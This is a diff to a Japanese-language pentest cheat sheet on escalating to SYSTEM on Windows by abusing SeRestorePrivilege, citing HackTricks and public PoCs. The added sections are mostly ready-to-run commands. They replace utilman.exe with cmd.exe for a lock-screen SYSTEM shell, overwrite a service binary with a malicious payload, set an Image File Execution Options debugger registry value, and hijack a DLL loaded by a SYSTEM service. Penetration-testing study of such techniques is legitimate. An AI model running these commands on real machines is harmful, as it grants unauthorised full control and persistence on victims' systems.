@@ -346,36 +346,67 @@ Invoke-BackupOperatorToDA -TargetDC dc01.domain.local -OutputPath C:\Temp\
 
 ## 5. SeRestorePrivilege → 任意ファイル書込 → SYSTEM
 
-**システム上の任意のファイルに書込可能**、DACL/ACLをバイパス。システムバイナリの上書きやDLLハイジャックで昇格。
+**システム上の任意のファイルへの書込アクセス**を付与し、ファイルのACLに関係なく書込が可能。サービスの変更、DLLハイジャック、Image File Execution Optionsによるデバッガ設定など、多数の昇格オプションがある。
 
-### 方法1：DLLハイジャック — サービスバイナリ置換
+> **参考：** [Priv2Admin — SeRestorePrivilege](https://github.com/gtworek/Priv2Admin)、[PrivFu PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeRestorePrivilegePoC)
+
+### 方法1：utilman.exe の置換（HackTricks推奨）
+
+```powershell
+# 1. PowerShell/ISEをSeRestorePrivilege付きで起動
+# 2. 特権を有効化
+# https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
+Import-Module .\EnableSeRestorePrivilege.ps1
+Enable-SeRestorePrivilege
+
+# 3. utilman.exeをcmd.exeに置換
+Rename-Item C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+Rename-Item C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+
+# 4. コンソールをロックしてWin+Uを押す → SYSTEMシェル
+```
+
+> **注意：** この攻撃はAVソフトウェアによって検出される可能性がある。
+
+### 方法2：サービスバイナリの置換
 
 ```cmd
-:: 1. SYSTEMとして実行中のサービスで、書込可能または置換可能なバイナリを持つものを探す
+:: "Program Files"に格納されたサービスバイナリを同じ特権で置換する代替手法
+
+:: 1. SYSTEMとして実行中のサービスで置換可能なバイナリを持つものを探す
 sc query state= all
 sc qc <SERVICE_NAME>
 
-:: 2. robocopy /B を使用（バックアップモード — SeRestorePrivilegeを書込にも使用）
-:: サービスバイナリを悪意のあるペイロードに置換
-robocopy /B C:\Temp\ "C:\Program Files\VulnService\" malicious.exe
+:: 2. サービスバイナリを悪意のあるペイロードに置換
+copy /Y C:\Temp\malicious.exe "C:\Program Files\VulnService\service.exe"
 
 :: 3. サービスを再起動
 sc stop <SERVICE_NAME>
 sc start <SERVICE_NAME>
 ```
 
-### 方法2：utilman.exe または sethc.exe の上書き
+### 方法3：Image File Execution Options（デバッガ設定）
 
 ```cmd
-:: utilman.exeをcmd.exeに置換（スティッキーキー攻撃）
-robocopy /B C:\Windows\System32 C:\Temp utilman.exe
-robocopy /B C:\Temp C:\Windows\System32 cmd.exe /A-:R
-ren C:\Windows\System32\cmd.exe utilman.exe
+:: SeRestorePrivilegeにより保護されたレジストリキーへの書込が可能
+:: ターゲットプログラム起動時に任意のデバッガ（ペイロード）を実行させる
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Temp\shell.exe" /f
 
-:: ロック画面で：Win+U → SYSTEM cmd.exe
+:: ロック画面でWin+U → shell.exeがSYSTEMとして実行される
 ```
 
-### 方法3：レジストリキーの変更
+### 方法4：DLLハイジャック
+
+```cmd
+:: SYSTEMサービスがロードするDLLを悪意のあるものに上書き
+copy /Y C:\Temp\malicious.dll "C:\Program Files\VulnService\missing.dll"
+
+:: サービスを再起動してDLLをロードさせる
+sc stop <SERVICE_NAME>
+sc start <SERVICE_NAME>
+```
+
+### 方法5：レジストリキーの変更
 
 ```powershell
 # SeRestorePrivilegeにより保護されたレジストリキーへの書込が可能
